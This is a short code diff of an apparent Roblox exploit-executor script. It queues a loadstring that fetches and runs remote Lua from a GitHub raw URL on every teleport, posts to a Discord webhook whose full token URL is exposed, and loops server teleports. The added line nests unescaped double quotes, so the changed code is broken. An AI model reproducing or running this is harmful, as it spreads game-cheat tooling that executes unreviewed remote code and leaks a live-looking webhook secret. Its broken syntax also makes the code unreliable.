@@ -101,7 +101,6 @@ mouse.KeyDown:connect(function(key)
         block_random_player()
         task.wait()
         player:Kick("hopping")
-        syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/ikottiz/hop/main/lua", true))()')
         syn.request({
             Url = "https://discord.com/api/webhooks/996102825820033154/cf_sRnk56r9IU32Z1WyflZJG9ZIFhVB2C74X3n3cSY0mG6V5R6dN39bZuyIPQUXuanXZ",
             Method = "POST",
@@ -111,5 +110,10 @@ mouse.KeyDown:connect(function(key)
         while wait(.5) do
             services.TeleportService:Teleport(3016661674)
         end
+    end
+end)
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
+    if State == Enum.TeleportState.Started then
+       syn.queue_on_teleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/ikottiz/hop/main/lua", true))()")
     end
 end)
